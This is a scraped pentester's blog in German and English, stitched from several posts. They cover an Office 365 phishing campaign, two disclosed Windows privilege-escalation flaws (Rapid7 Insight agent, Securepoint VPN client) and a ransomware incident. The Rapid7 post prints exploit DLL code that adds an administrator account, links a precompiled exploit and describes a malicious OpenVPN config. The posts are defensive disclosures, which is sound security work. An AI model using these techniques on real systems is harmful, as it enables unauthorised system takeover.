Gibt der Anwender seine Daten ein, wird eine x-beliebige PDF Datei angezeigt. Dieses Vorgehen deckt sich mit unseren Red-Teaming / Friendly Phishing Erfahrungen: es ist wichtig dem Benutzer Feedback zu geben. Selbst wenn es sich dabei um sinnlose Informationen handelt, reicht dies aus, damit die IT Abteilung NICHT über einen möglichen Fehler informiert wird. Die Attacke bleibt dadurch unentdeckt.

![](https://bogner.sh/wp-content/uploads/2020/01/Screenshot-2020-01-08-at-17.52.15.png)
## Die Analyse

Da leider bereits einige unserer Kunden Opfer der hier beschriebenen Attacke wurden, konnten wir das Vorgehen mehrfach analysieren. Das folgenden Bild illustriert die wichtigsten Abläufe (natürlich anonymisiert):

![](https://bogner.sh/wp-content/uploads/2020/01/IMG_1531.jpg)

Bei allen gekaperten Mailboxen konnten wir nach der initialen Kompromittierung mehrere unautorisierte Zugriffe durch die Angreifer feststellen. U.a. wird dabei auch das IMAP Protokoll eingesetzt. Es ist also davon auszugehen, dass Daten exfiltiert wurden.

Nach Tagen, teilweise sogar Wochen, wird dann das eigene Konto verwendet um selbst Spam Nachrichten an alle Kontakte zu versenden. Dabei wird die versendete Phishing Nachricht auch an den jeweiligen Absender angepasst. Beispielsweise wird die Signatur übernommen und auch der Firmenname in den Phishing Seiten eingebaut. Damit der gerade stattfindenden Spam Versand nicht durch Fehlermeldungen vom Benutzer entlarvt werden kann, werden u.a. Outlook Regeln eingesetzt, die eingehende Nachrichten automatisiert löschen.

All diese Maßnahmen machen die Fake-Mails viel erfolgreicher und erschweren die Erkennung erheblich. Phishing auf den Schultern von Riesen!

Sollten Sie selbst Opfer einer Cyber Attacke geworden sein, stehen wir mit unserem Know How hilfreich zur Seite.

Egal ob Phishing, Cryptolocker oder Datendiebstahl. Wir können helfen: [Bee IT Security](https://www.bee-itsecurity.at)!

![](https://bogner.sh/wp-content/uploads/2018/12/bee_it_security.png)

 Posted by [florian](https://bogner.sh/author/florian/) at 17:25

## [Local Privilege Escalation in Rapid7’s Windows Insight IDR Agent](https://bogner.sh/2019/06/local-privilege-escalation-in-rapid7s-windows-insight-idr-agent/ "Local Privilege Escalation in Rapid7’s Windows Insight IDR Agent")

 [Uncategorized](https://bogner.sh/category/uncategorized/)
 [No Responses »](https://bogner.sh/2019/06/local-privilege-escalation-in-rapid7s-windows-insight-idr-agent/#respond)

Jun 032019

With [Insight IDR](https://www.rapid7.com/products/insightidr/) Rapid7 has created a very powerful, yet still easy to use Incident Detection and Response toolkit. During one of my latest assignments I found its Windows agent installed on my client’s systems.

While trying to disable it so that I can stay under the radar, I discovered a privilege escalation vulnerability in its Windows service. This vulnerability could be abused by any local user to gain full control over the affected system. It has been verified on a fully patched German Windows 10 x64 running Insight Agent v2.6.3.14. **The issue has been fixed with version 2.6.5.**

*PS: Did I mention that I run my own company? It’s called [Bee IT Security](https://www.bee-itsecurity.at)[German only], just in case you need world class penetration testing or security consulting services.

![](https://bogner.sh/wp-content/uploads/2018/12/bee_it_security.png)*

The underlying issue is that the ir\_agent Windows Service, which is automatically started on system boot and runs with SYSTEM privileges, tries to load the DLL C:\DLLs\python3.dll

![](https://bogner.sh/wp-content/uploads/2019/05/2a.png)

Although this path does not exist by default, it can be created by any local user. This is possible because the filesystem ACLs of the system drive allow anyone to create [new subfolders](https://msdn.microsoft.com/en-us/library/windows/desktop/gg258116%28v%3Dvs.85%29.aspx?f=255&MSPPError=-2147217396).

![](https://bogner.sh/wp-content/uploads/2019/05/3.png)

With that knowledge, I created a new DLL that mimics the expected exports of the real python3.dll. However, instead of providing any of the expected functionality, it simply adds a new administrative user “attacker” to the system. You can download the full source [here](https://bogner.sh/wp-content/uploads/2019/05/DLL.zip).

```

/*
Implement DLLMain with common datatypes so we don't have to include windows.h.
Otherwise this would cause several compile errors because of the already known but reexported functions.
*/
int DllMain(void* hinst, unsigned long* reason, void* reserved) {
	system("cmd /c \"date &amp;gt;&amp;gt; C:\\this_should_not_work.txt\"");
	system("net user attacker Batman42 /add");
	system("net localgroup Administrators attacker /add");
	system("net localgroup Administratoren attacker /add");
	exit(1);
	return 0;
}
...

```

After compiling it into a DLL I saved it (logically with a standard User account) as C:\DLLs\python3.dll.

![](https://bogner.sh/wp-content/uploads/2019/05/4.png)

After a reboot the DLL was loaded by the privileged Windows service ir\_agent and the user attacker was created.

![](https://bogner.sh/wp-content/uploads/2019/05/5-1.png)
# Proof of Concept

To confirm this issue yourself install the Insight IDR Windows Agent v2.6.3.14 (The issue has been fixed with version 2.6.5) and download the precompiled version of the [malicious exploit DLL](https://bogner.sh/wp-content/uploads/2019/05/DLL.zip).

After that, as a non-admin user, create the folder C:\DLLs and place the library python3.dll therein. Now simply reboot the system. After that the new admin user attacker will be added. This proofs that full SYSTEM level access has been gained.

# Suggested solution

All external dependencies should only be loaded from secure locations.

# Timeline

* 22.5.2019: The issue has been identified, documented and reported
* 22.5.2019: The vulnerability has been confirmed by Rapid7
* 29.5.2019: Rapid7 released a new version (2.6.5) of the Insight agent that fixes this vulnerability. CVE-2019-5629 has been assigned.

 Posted by [florian](https://bogner.sh/author/florian/) at 05:24

[Older Entries](https://bogner.sh/page/2/)

### Search

### Pages

* [About Me](https://bogner.sh/about-me/)
  + [Curriculum Vitae](https://bogner.sh/wp-content/uploads/2017/11/Florian-Bogner-CV-20171126-NP.pdf#new_tab)
  + [LinkedIn Profile](https://www.linkedin.com/profile/view?id=368904276#new_tab)
  + [XING Profile](https://www.xing.com/profile/Florian_Bogner9#new_tab)
* [Donate](https://bogner.sh/donate1/)
* [Privacy Policy](https://bogner.sh/privacy-policy/)
* [Projects](https://bogner.sh/projects/)
* [References](https://bogner.sh/references/)
### Categories

* [Hardware](https://bogner.sh/category/hardware/) (4)
* [Linux](https://bogner.sh/category/linux/) (10)
* [Mac OS X](https://bogner.sh/category/mac-os-x/) (41)
* [Network](https://bogner.sh/category/network/) (6)
* [Security](https://bogner.sh/category/security/) (39)
* [Software](https://bogner.sh/category/software/) (34)
* [Tipps](https://bogner.sh/category/tipps/) (60)
* [Tools](https://bogner.sh/category/tools/) (21)
* [UAC Technikum Vienna](https://bogner.sh/category/uac-technikum-vienna/) (2)
* [Uncategorized](https://bogner.sh/category/uncategorized/) (18)
* [Web Security](https://bogner.sh/category/web-security/) (2)
* [Windows](https://bogner.sh/category/windows/) (27)

### Recent Posts

* [G DATA Anti-Virus: Abusing OpenSSL to get local admin](https://bogner.sh/2021/10/g-data-anti-virus-abusing-openssl-to-get-local-admin/)
* [CVE-2021-35523: Local Privilege Escalation in Securepoint SSL VPN Client 2.0.30](https://bogner.sh/2021/06/local-privilege-escalation-in-securepoint-ssl-vpn-client-2-0-30/)
* [TeslaRVNG2 meets HAFNIUM Exchange Exploit](https://bogner.sh/2021/05/teslarvng2-meets-hafnium-exchange-exploit/)
* [Dirty Offline Bulk IP Geolocation](https://bogner.sh/2021/01/dirty-offline-bulk-ip-geolocation/)
* [Egregor Post-Incident Monitor / Protector Script](https://bogner.sh/2020/12/egregor-post-incident-monitor-protector-script/)
### Meta

* [Log in](https://bogner.sh/wp-login.php)
* [Entries feed](https://bogner.sh/feed/)
* [Comments feed](https://bogner.sh/comments/feed/)
* [WordPress.org](https://wordpress.org/)

| © 2012 [bogner.sh](http://bogner.sh) |  | [Suffusion theme by Sayontan Sinha](http://aquoid.com/news/themes/suffusion/) |
| --- | --- | --- |



=== Content from bogner.sh_a45b709f_20250126_043631.html ===

# [#bogner.sh](https://bogner.sh)

## [CVE-2021-35523: Local Privilege Escalation in Securepoint SSL VPN Client 2.0.30](https://bogner.sh/2021/06/local-privilege-escalation-in-securepoint-ssl-vpn-client-2-0-30/ "CVE-2021-35523: Local Privilege Escalation in Securepoint SSL VPN Client 2.0.30")

 [Security](https://bogner.sh/category/security/), [Windows](https://bogner.sh/category/windows/)
 [No Responses »](https://bogner.sh/2021/06/local-privilege-escalation-in-securepoint-ssl-vpn-client-2-0-30/#respond)

Jun 292021

*[ Preamble: A big thanks to the team at Securepoint! They immediately triaged our report and released an initial fix within days. Never forget: Every piece of software contains bugs! It depends on how you deal with them. ]*

During the audit of the Windows 10 base image of one of our clients, we discovered that they were using the free [Securepoint SSL VPN Client](https://www.securepoint.de/produkte/utm-firewalls/vpn-client.html). To be precise, version 2.0.30 – the current release as of writing – was installed.

Diese Schwachstelle wurde im Zuge eines unserer Hacking Workshops identifiziert. Mehr dazu auf unserer Webseite: [Bee IT Security](https://www.bee-itsecurity.at) – Wir machen IT Security verständlich, so dass Sie die richtigen Entscheidungen treffen können!

![](https://bogner.sh/wp-content/uploads/2018/12/bee_it_security.png)

While taking a first glance at the application, it became clear that it uses two different components: on the one hand there is the user interface (1), which is executed in the context of the current user. On the other hand there is a Windows service which is executed as SYSTEM (2). This could be quite interesting from an attacker’s point of view, in case a normal user could manipulate the backend service in any way.

![](https://bogner.sh/wp-content/uploads/2021/04/SnipImage11.jpg)

To learn more about the inner workings I used [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon). As shown in the following screenshot the user interface component *SSLVpnClient.exe* (1) uses a TCP connection to communicate with the Windows service *SPSSLVpnService.exe* (2). As discussed before, this service runs as SYSTEM. The actual VPN connection is established by *OpenVPN.exe* (3). The most interesting learning however was, that a OpenVPN configuration file, which is stored in the current users home folder, is passed as argument (4). This means, the file is fully attacker controlled.

![](https://bogner.sh/wp-content/uploads/2021/04/SnipImage23.jpg)

While reading the [OpenVPN manual](https://community.openvpn.net/openvpn/wiki/Openvpn24ManPage), I found something interesting: By using (for example) the *–tls-verify* directive from within an *\*.ovpn* configuration file, it is possible to execute arbitrary commands. Hence, I created myself a malicious VPN configuration file. As shown in the right window, it launched the *C:\Users\Public\lpe.bat* file.

![](https://bogner.sh/wp-content/uploads/2021/04/SnipImage75.jpg)

After saving the \*.*ovpn* file into a folder with the same name in *C:\Users\<username>\AppData\Roadming\Securepoint SSL VPN\config\* and restarting the SecurePoint VPN User interface, it is possible to connect to our malicious VPN.

![](https://bogner.sh/wp-content/uploads/2021/04/SnipImage79.jpg)

By doing so, the *tls-verify* script is executed as SYSTEM and a new administrative user attacker is added. Hence, a normal non-administrative user gained full control over the affected endpoint.

![](https://bogner.sh/wp-content/uploads/2021/04/SnipImage46.jpg)
## Timeline

* 14.04.2021: The vulnerability was discovered and reported to security@securepoint.de
* 15.04.2021: The report was triaged
* 26.04.2021: Securepoint SSL VPN Client Version 2.0.32 was released, which contains an initial fix for the vulnerability
* 23.06.2021: Securepoint SSL VPN Client Version 2.0.34 was released, which contains additional security measures.
* 28.06.2021: CVE-2021-35523 was assigned: <https://nvd.nist.gov/vuln/detail/CVE-2021-35523>
* 29.06.2021: Responsible disclosure in cooperation with Securepoint: <https://github.com/Securepoint/openvpn-client/security/advisories/GHSA-v8p8-4w8f-qh34>

 Posted by [florian](https://bogner.sh/author/florian/) at 07:00

## [TeslaRVNG2 meets HAFNIUM Exchange Exploit](https://bogner.sh/2021/05/teslarvng2-meets-hafnium-exchange-exploit/ "TeslaRVNG2 meets HAFNIUM Exchange Exploit")

 [Security](https://bogner.sh/category/security/)
 [No Responses »](https://bogner.sh/2021/05/teslarvng2-meets-hafnium-exchange-exploit/#respond)

May 032021

This is the story of a recent Incident Response that we – as [Bee IT Security](https://bee-itsecurity.at/) – had to deal with. The first impression was pretty clear: many of the victim’s most important servers as well as clients were encrypted. One of the domain controllers also showed a ransom note which is never good sign. After a quick glance at the Window title, it was pretty clear that we had to deal with TeslaRVNG2 (anonymised screenshot from a sandbox):

![](https://bogner.sh/wp-content/uploads/2021/05/Screenshot-1.png)

In contrast to REvil or DoppelPaymer there is not much information available about common TeslaRVNG2 TTPs. Hence, we started by analysing one of the encrypted clients with the goal of identifying the internal source of the attack. Thereby we found the following Logon Event (Event id 4624) which documents that the actual Domain Administrator logged on to the now encrypted PC. That event was created in the middle of the night (local time) and just a few hours before the last modified date of the encrypted files. Additionally, all the IT employees use named administrative accounts, which means this logon was caused by the attackers. The source was one of the company’s domain controllers.

![](https://bogner.sh/wp-content/uploads/2021/05/Screenshot-2021-05-02-at-19.13.36.png)

A few seconds after that first logon, the Anti-Virus service was killed as well. Another clear indication that this activity was caused by the criminals.

## The Domain Controller

Hence, we now focused our analysis on the domain controller that was logged as the source of the login. After taking a snapshot, we captured our live response data and waited for the parsing to finish. During that time, I was curious and took a quick glance at the Windows directory. Multiple files caught my attention: MEMORY.dmp, msmpene.exe , …

![](https://bogner.sh/wp-content/uploads/2021/05/3_EXE-in-Windows.jpg)

More interesting stuff was located in inetsrv (*C:\Windows\System32\inetsrv*\). Is this server also the victim’s Exchange Server? Can you already guess what has happened?

![](https://bogner.sh/wp-content/uploads/2021/05/5_inetsrv-1.jpg)

Maybe we start by taking a closer look at *c.ps1*. As shown below *certutil* is abused to download additional payloads. For example, *m6.exe* is a Bitcoin Miner and *dn.ps1* established as backdoor. What immediately confirmed my initial guess: There are many activities (*echo* commands) that suggest that the HAFNIUM Exchange vulnerabilities were part of the attack.

![](https://bogner.sh/wp-content/uploads/2021/05/2_Script-1.jpg)

After talking to the system administrators this guess was confirmed. There were issues with installing the latest Exchange CU, which caused the server to be vulnerable for the critical vulnerabilities for too long.

## The TeslaRVNG2 Cryptolocker

So we now know how the attackers got initial access. But let’s focus on the actual cryptolocker (*msmpene.exe*). By executing the sample in a sandbox, we identified a plaintext log file that was masked as a DLL (*msvsc.dll*). This file gave us a good understanding about what has happened:

![](https://bogner.sh/wp-content/uploads/2021/05/Screenshot-2021-05-02-at-19.44.31.png)

After the malware was launched (0) a network scan is started (1). Based on the observed behaviour we conclude that the IP range is derived from the current IP. However, the malware always used a /24 network here. So, if your company uses multiple subnets, this ransomware will not affect all of them. Again: please implement a network segmentation with a firewall in between!

In a separate thread the local disc is encrypted (2). During that process the original filenames are kept, making it more difficult for end-users to detect the ongoing attack.

For all identified hosts on the network (3) the access level is checked. If admin privileges are available different techniques are used to stop installed anti-virus solutions. After that all shares (4) are encrypted (5). So, there is no “real” lateral movement. The ransomware simply abuses Windows file sharing.

As soon as the local disc was fully encrypted the renaming process was started (6) (*original.txt => id[\*\*\*\*\*\*\*\*].[contact@domain.com].original.txt.teslarvng2*) and the ransom notes (7) are placed.

By comparing the victim’s log with the log of a fully encrypted system we can conclude that the process was interrupted. As shown below, if everything is finished the malware prints “the end :L”. That entry however is missing in the customer’s log.

![](https://bogner.sh/wp-content/uploads/2021/05/Picture-1.png)

Luckily a working backup was available, and the infrastructure could be rebuilt within days! No ransom was paid.

## IOCs

| **Type** | **Description** | **IOC** |
| --- | --- | --- |
| Hash | c.ps1 | c1bb24572db470c07ece739b889032ad9ab28e4d |
| Hash | msmpene.exe | e365a6acd90eb50ddc067790845b6ade0e1034ed |
| Hash | msmpene86.exe | dd9089097c559b1addbefd37b2da0e4bc2334244 |
| Hash | bd.bat | 7ad79e9e92346c425aa2b2ca1caeb64c33451a8d |
| Hash | svchost.exe | 630814297fc44d6df895e60490c57955cad3db31 |
| Host |  | t.hwqloan.com |
| Path |  | C:\inetpub\wwwroot\aspnet\_client\js\demo\wanlins.aspx |
| Path |  | C:\inetpub\wwwroot\aspnet\_client\js\demo\wanlin.txt |
| Hash | dns.ps1 | 0165405f79d402baec05078c4b4559f400a826f5 |
| Hash | m6.exe | 8f72a1e1faf496c05852338dd72aea868aa0f835 |

 Posted by [florian](https://bogner.sh/author/florian/) at 05:00

## [Dirty Offline Bulk IP Geolocation](https://bogner.sh/2021/01/dirty-offline-bulk-ip-geolocation/ "Dirty Offline Bulk IP Geolocation")

 [Security](https://bogner.sh/category/security/), [Tools](https://bogner.sh/category/tools/), [Uncategorized](https://bogner.sh/category/uncategorized/)
 [No Responses »](https://bogner.sh/2021/01/dirty-offline-bulk-ip-geolocation/#respond)

Jan 192021

As of recently, I quite often receive Excel files with hundreds of IPs which need to be geolocated ([Can you guess where they come from](https://docs.microsoft.com/en-us/microsoft-365/compliance/search-the-audit-log-in-security-and-compliance?view=o365-worldwide)?). Sure, I could import them into our Elastic stack, but would that post then be titled “Dirty”?

So we need to come up with a different solution. While researching the topic, the first thing that became clear was that I need an offline solution. Although most of the time I just try to locate a handful of addresses, but this sometimes explodes to up to 5.000. In that case, it is almost impossible to find a suitable web API. The most generous free services only provide up to 1.000 lookups per week.

Luckily there is [MaxMind](https://www.maxmind.com/). They are the company behind GeoIP, which also offers a free offline database. Simple register for an [account on their website](https://www.maxmind.com/en/geolite2/signup).

![](https://bogner.sh/wp-content/uploads/2021/01/Screenshot-2021-01-18-at-20.13.02.png)

[Then access your account](https://www.maxmind.com/en/account/login) and select “Download Files” in the left menu. From the list, select the “GeoLite2 City” database file. It’s important to use the GeoIP2 Binary format.

![](https://bogner.sh/wp-content/uploads/2021/01/Screenshot-2021-01-18-at-20.15.11.png)

Finally, it’s time to get dirty: Download the script [dirtyiplocate.py](https://github.com/fbogner/dirtyiplocate/blob/main/dirtyiplocate.py) from Github or clone the whole repository. After that, the geoip2 modules needs to be installed (*pip install geoip2*).

![](https://bogner.sh/wp-content/uploads/2021/01/Screenshot-2021-01-18-at-20.19.41.png)

After all that hard work, *dirtyiplocate.py* is ready to rumble. As shown in the following screenshot it’s pretty easy to use. Provide a text file with IPs you want to locate (the *–ips* argument) and specify the output CSV file (the *–output* parameter). In case you want the results to be appended to the output file instead of overwriting it, the *–append* argument can be used.

![](https://bogner.sh/wp-content/uploads/2021/01/Screenshot-2021-01-18-at-20.22.50.png)

The following screenshot shows the output of *dirtyiplocate.py*. Excel’s [VLOOKUP](https://support.microsoft.com/en-us/office/vlookup-function-0bbc8083-26fe-4963-8ab8-93a18ad188a1) can now be used to incorporate this data into existing lists. Please always use the datatype TEXT for IP addresses. Otherwise a unicorn dies!

![](https://bogner.sh/wp-content/uploads/2021/01/Screenshot-2021-01-18-at-20.31.40.png)

To summaries: I built a dirty script that can be used to do bulk IP geolocation. It can be downloaded here: <https://github.com/fbogner/dirtyiplocate>

 Posted by [florian](https://bogner.sh/author/florian/) at 05:59

## [IT Security “Hausmittel”](https://bogner.sh/2020/11/it-security-hausmittel/ "IT Security “Hausmittel”")

 [Security](https://bogner.sh/category/security/)
 [No Responses »](https://bogner.sh/2020/11/it-security-hausmittel/#respond)

Nov 162020

Erfahrungsgemäß sind IT Security Maßnahmen häufig schwierig zu implementieren und verursachen beträchtliche Kosten. Im Zuge unserer Tätigkeit als Security Consultants und Pentester haben wir aber einige Wege erarbeitet, wie einfach und kosteneffizient der Security Level der Infrastruktur erheblich verbessert werden kann.

Die 10 wichtigen „IT Security Hausmittel“ haben wir dazu in einem entsprechenden Whitepaper zusammengefasst.

Im Detail werden dabei drei unterschiedliche Maßnahmen-Kategorien empfohlen:

1. **Infektion**
   Um die Initiale Infektion von Endgeräten zu erschweren, werden Tipps zur Absicherung von gefährlichen Datentypen, Office Makros und PowerShell aufgezeigt
2. **Ausbreitung**
   Der Missbrauch von privilegierten Benutzerkonten ist häufig bei Attacken zu beobachten. Dementsprechend ist es entscheidend diese zu schützen. Einfache Gruppenrichtlinien, wie die Nutzung der PPL Technologie für den lsass.exe Prozess oder die automatische Abmeldung von administrativen Konten helfen digitale Angriffe erheblich zu erschweren.
3. **Compliance**
   Viele Unternehmen kämpfen auch immer noch mit Basistechnologien wie beispielsweise der Festplattenverschlüsselung. Wiederum mit einer Gruppenrichtlinie ist die Aktivierung dieser über BitLocker einfach möglich.

Das Whitepaper mit diesen und vielen weiteren Empfehlungen können Sie kostenlos unter folgender Webadresse herunterladen:

[![](https://bogner.sh/wp-content/uploads/2020/07/Screenshot-2020-07-06-at-10.18.23.png)](https://bee-itsecurity.at/downloads/IT%20Security%20Hausmittel)

Wir als Bee IT Security machen IT Security verständlich, so dass Sie die richtigen Entscheidungen treffen können. Unser Portfolio umfasst: Workshops, Penetration Tests, simuliertes Phishing. Wir freuen uns auf Ihre Kontaktaufnahme unter office@bee-itsecurity.at

 Posted by [florian](https://bogner.sh/author/florian/) at 10:15

## [Oh nein: Unser Honeypot ist verschlüsselt ;-)](https://bogner.sh/2020/04/oh-nein-unser-honeypot-ist-verschlusselt/ "Oh nein: Unser Honeypot ist verschlüsselt ;-)")

 [Security](https://bogner.sh/category/security/)
 [No Responses »](https://bogner.sh/2020/04/oh-nein-unser-honeypot-ist-verschlusselt/#respond)

Apr 062020

Wir als [Bee IT Security](https://bee-itsecurity.at/) unterstützten unsere Kunden tatkräftig bei der Absicherung Ihrer Infrastrukturen. Dabei ist es aber natürlich auch unerlässlich die Taktiken der Angreifer zu kennen und zu verstehen. Genau deshalb betreiben wir auch eigene Honeypots: absichtlich anfällige Server im Internet, die von Kriminellen gekapert werden können. Ziel ist es, deren Aktionen aufzuzeichnen, zu analysieren und schlussendlich sicherzustellen, dass die eigenen Absicherungsmaßnahmen die Angriffe abgewehrt hätten.

Mein Lieblings-Honeypot hört auf den Namen “MXB System” und ist mittels des Benutzernamen *admin* und dem absolut sicheren Passwort *admin* direkt aus dem Internet per RDP erreichbar. Für das Monitoring setzen wir eine Vielzahl unterschiedlicher Technologien ein:

![](https://bogner.sh/wp-content/uploads/2020/04/Screenshot-2020-04-05-at-19.46.58.png)

Mit [Sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon) protokollieren wir alle Prozessstarts, Datei- und Registryänderungen aber auch jeglichen Netzwerkverkehr. Der [Blackcat Keylogger](https://0x00sec.org/t/blackcat-keylogger/10307) zeichnet zusätzliche alle Tastatureingaben auf. Da viele Cyberangriffe auf Powershell aufbauen, [werden diese Befehle auch geloggt](https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html). Damit wir sofort bescheid wissen, sobald unser Honeypot attackiert wird, haben wir unser Microsoft Teams integriert, wodurch [Live Notifications](https://docs.microsoft.com/en-us/microsoftteams/platform/webhooks-and-connectors/how-to/connectors-using#setting-up-a-custom-incoming-webhook) möglich werden. Um das Vorgehen der Kriminellen besser zu verstehen, haben wir an unterschiedlichen Stellen im Dateisystem auch Fake Inhalte platziert. Alle Aktivitäten der RDP Sitzung werden mit [FFmpeg](https://www.ffmpeg.org/) auch als Video aufgezeichnet. Und genau darum geht es in diesem Blogeintrag!

Im Folgenden finden Sie ein Video, das die Verschlüsselung unseres Honeypots und das Vorgehen der Kriminellen im Detail zeigt. Besonders spannend daran ist jedoch, dass zuvor der komplette Rechner analysiert und auch Lateral Movement versucht wird. Also gleich ansehen:

Bei der vom Angreifer verwendeten Cryptolocker Schadsoftware handelt es sich übrigens um Standardkomponenten: CrySIS. Diese wird sehr oft in der von uns beobachteten Form per RDP Bruteforcing in Unternehmensnetzwerke eingeschleust. Siehe dazu auch das wirklich gelungene [Threat Spotlight von Malwarebytes](https://blog.malwarebytes.com/threat-analysis/2019/05/threat-spotlight-crysis-aka-dharma-ransomware-causing-a-crisis-for-businesses/).

Das hier eingesetzte Sample war übrigens schon von praktisch allen Virenscannern als bösartig eingestuft. Da die Infektionen aber manuell stattfindet, werden die installierten Virenscanner einfach deaktiviert.

![](https://bogner.sh/wp-content/uploads/2020/04/Screenshot-2020-02-13-at-13.17.44.png)

In unserem Fall wäre ein Zahlung von 3.000€ von den Angreifern gefordert worden. Leider kann man sich jedoch oft nicht auf die Aussagen der Kriminellen verlassen. Wird die initiale Forderung beglichen, kann es passieren, dass das Lösegeld noch einmal erhöht wird:

![](https://bogner.sh/wp-content/uploads/2020/04/Untitled.png)
## Wie bricht man in RDP Server ein?

Um überhaupt in unseren Honeypot einzubrechen, kann beispielsweise Masscan und RDP Brute verwendet werden. Im ersten Schritt werden dabei mittels der in [Masscan](http://toolshacke.blogspot.com/2016/12/masscan-gui-windows.html) hinterlegten Länder IP Ranges öffentlich erreichbare RDP Server gesucht. Der eigentliche Einbruchsversuch kann anschließend mit [RDP Brute](https://hack-nesia.blogspot.com/2016/07/rdp-brute-coded-by-z668.html) oder NL Brute durchgeführt werden. Beide Tools ermöglichen Wörterbuchangriffe auf schwache Benutzerpasswörter:

![](https://bogner.sh/wp-content/uploads/2020/04/Screenshot-2020-04-05-at-20.02.05.png)

Viele der so gekaperten Rechner werden nicht nur verschlüsselt, sondern auch auf Plattformen wie dedic.top für wenig Geld weiterverkauft. Als Käufer kann man hier komfortabel auf den Serverstandort, Admin Rechte und “Entdeckungsrisiko” filtern. Sollte der so gekaufte “Dedic” vom eigentlichen Besitzer gesperrt worden sein, gibt es natürlich kostenlos Ersatz.

![](https://bogner.sh/wp-content/uploads/2020/04/Screenshot-2020-04-05-at-20.18.55.png)
## Wie kann ich mich schützen?

IT Security muss nicht immer teuer sein! Ganz im Gegenteil, ein guter Basisschutz reicht in vielen Fällen bereits aus, um Cyberangriffe zu verhindern – so auch hier.

### **RDP nicht direkt im Internet publizieren & Multi-Faktor Authentifizierung**

Es sollte immer ein Remote Desktop Gateway verwendet werden, der zusätzliche Sicherheitsfunktionen bereitstellt. Besonders wichtig ist hier der zweite Authentifizierungsfaktor z.B. per Smartphone-App für Remotezugriffe.

### **Verwenden Sie Lockout Policies**

Unser Honeypot wird primär durch Wörterbuchangriffe übernommen. Leider mussten wir auch bereits einige echte Incidents nach Einbrüchen über RDP bearbeiten. Durch die Nutzung einer Lockout Policy hätten viele verhindert werden können.

### **Mitarbeiter Awareness**

Alleine durch Technik ist es nicht möglich die eigene Organisation ausreichend zu schützen! Entscheidend ist die Mitarbeiter auf die Bedrohungen durch Cyberkriminalität zu schulen. Wir können hier unseren Partner [nextbeststep](https://www.nextbeststep.at/) nur wärmstens empfehlen!

### **IT Systeme härten** (“Hacking Workshops”)

Es gibt noch viele weitere einfache Tricks, wie das eigene Netzwerk noch besser gegen Angriffe abgesichert werden kann. Dies lassen sich am Besten im Zuge von “Hacking Workshops” vermitteln. In unseren geführten Security Audits hacken wir gemeinsam mit Ihrer IT Abteilung die eigene Infrastruktur und erarbeiten anschließend gemeinsam entsprechende Absicherungsmaßnahmen. Dieses Vorgehen bringt einen langfristigen IT Security Mehrwert in der IT Abteilung und hilft sofort wichtige Absicherungsmaßnahmen umzusetzen. Das besondere: Wir helfen gleich bei der Implementierung mit – das ganze ohne eigenes Produkt-Portfolio.

Bei Fragen zu diesem Artikel oder unseren Hacking Workshops, senden Sie mir am Besten eine Mail an: florian [@] bee-itsecurity.at

 Posted by [florian](https://bogner.sh/author/florian/) at 00:30

## [Phishing auf der Schulter von Riesen](https://bogner.sh/2020/01/phishing-auf-der-schulter-von-riesen/ "Phishing auf der Schulter von Riesen")

 [Security](https://bogner.sh/category/security/)
 [No Responses »](https://bogner.sh/2020/01/phishing-auf-der-schulter-von-riesen/#respond)

Jan 082020

Aktuell gibt es im deutschsprachigen Raum eine neue Phishing Welle, die es vor allem auf Office 365 Konten absieht. Das besondere daran: die Office 365 Infrastruktur ist selbst Teil der Attacke.

Leider erscheint die neue Taktik aber auch sehr gut zu funktionieren. Wir haben mittlerweile mehrere Kunden die mit entsprechend kompromittierten Konten konfrontiert sind. Über das Microsoft 365 Admin Center und den [Audit Log Search](https://protection.office.com/unifiedauditlog) ist es im Fall der Fälle aber relativ gut möglich die Größe der Infektion zu erkennen und entsprechende Gegenmaßnahmen (Passwort Resets; Meldung bei DSB) einzuleiten.

Aber zurück zur eigentlichen Attacke. Im Folgenden werden wir ein anonymisiertes Beispiel verwenden, um die verschiedenen Teilschritte zu analysieren.

## Das Phishing Mail

Als Eintrittspunkt in die Organisation werden meist legitim aussehende Phishing Mails, wie das Folgende eingesetzt. Das gemeine daran: Beim Absender handelt es sich um ein echte Firma, der richtigen Firmendomäne und der passenden Signatur. Nur der Inhalt der Nachricht könnte zum Nachdenken anregen.

![](https://bogner.sh/wp-content/uploads/2020/01/Screenshot-2020-01-08-at-17.13.57.png)
## Die Landing Page

Aber hier kommt schon der nächste Trick der Angreifer: der eingebettete Link zeigt auf einen bereits vorab gekaperten Account auf Office 365. In diesem Fall auf eine OneNote Notiz. Dies erschwert es einerseits den technischen Schutzmaßnahmen, da die Microsoft Domänen ein hohes Vertrauen genießen. Andererseits kennen auch die Anwender Microsoft als “sicheres” Unternehmen.

![](https://bogner.sh/wp-content/uploads/2020/01/Screenshot-2020-01-08-at-17.17.47.png)

Neben OneNote werden aber auch noch andere Produkte, wie beispielsweise Sway von den Angreifern eingesetzt:

![](https://bogner.sh/wp-content/uploads/2020/01/Screenshot-2020-01-08-at-17.42.17.png)

Das heißt, die Kriminellen missbrauchen das komplette Office 365 Portfolio. Das Schema ist aber immer das gleiche: das potentielle Opfer soll einem Link auf eine Drittseite folgen.

*Besonders perfide: Kann der eigene Account gekapert werden, wird auch dieser in Phishing Angriffen eingesetzt!*

## Die eigentliche Phishing Seite

Klickt der Endanwender tatsächlich auf den Link, landet er/sie auf der eigentlichen Phishing Seite. Hier sind die Angreifer nicht wählerisch und bieten viele verschiedene “Anmeldeverfahren” an. Der Benutzer kann selbst auswählen welche Zugangsdaten er/sie preisgeben möchte.

![](https://bogner.sh/wp-content/uploads/2020/01/Screenshot-2020-01-08-at-17.18.07.png)

Wird beispielsweise Office 365 selektiert, erscheint eine der echten Microsoft Loginseite nachempfundene Anmeldemaske.

![](https://bogner.sh/wp-content/uploads/2020/01/Screenshot-2020-01-08-at-17.18.12.png)
## Das Finale

Gibt der Anwender seine Daten ein, wird eine x-beliebige PDF Datei angezeigt. Dieses Vorgehen deckt sich mit unseren Red-Teaming / Friendly Phishing Erfahrungen: es ist wichtig dem Benutzer Feedback zu geben. Selbst wenn es sich dabei um sinnlose Informationen handelt, reicht dies aus, damit die IT Abteilung NICHT über einen möglichen Fehler informiert wird. Die Attacke bleibt dadurch unentdeckt.

![](https://bogner.sh/wp-content/uploads/2020/01/Screenshot-2020-01-08-at-17.52.15.png)
## Die Analyse

